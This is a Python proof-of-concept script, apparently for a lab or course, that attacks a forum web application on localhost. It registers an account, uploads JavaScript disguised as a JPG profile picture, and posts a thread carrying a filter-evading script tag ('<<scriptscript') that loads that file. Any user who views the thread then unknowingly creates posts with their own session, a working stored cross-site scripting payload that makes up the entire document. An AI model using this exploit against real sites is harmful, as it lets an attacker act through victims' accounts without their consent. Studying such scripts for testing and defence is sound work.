import requests

with requests.Session() as session:
    # Create the attacker's account
    user = {
        "username": "verynice",
        "password": "a1",
        "password2": "a1",
        "plate": "ABC123",
    }

    r = session.post("http://localhost:3000/signup", data=user)

    print(r.reason)

    # We upload the malicious profile picture
    file_body = """
    const body = new URLSearchParams({
      subject: "I have been hacked",
      body: "This thread has been created without my consent"  
    });
    fetch(`/createThread?topic=webdev`, {method: "POST", body:body, credentials:"same-origin"}).then(() => {});
    """
    files = {"avatar": ("notsuspiciousimage.jpg", file_body, "application/json")}
    r = session.post("http://localhost:3000/upload", files=files)
    print(r.reason)

    # Finally we create the malicious post
    injection = '<<scriptscript src="/images/profileImages/verynice"></script>'

    thread = {
        "subject": "Very intersting !! Come see",
        "body": injection,
    }

    r = session.post(
        "http://localhost:3000/createThread?topic=entertainment", data=thread
    )
    print(r.reason)
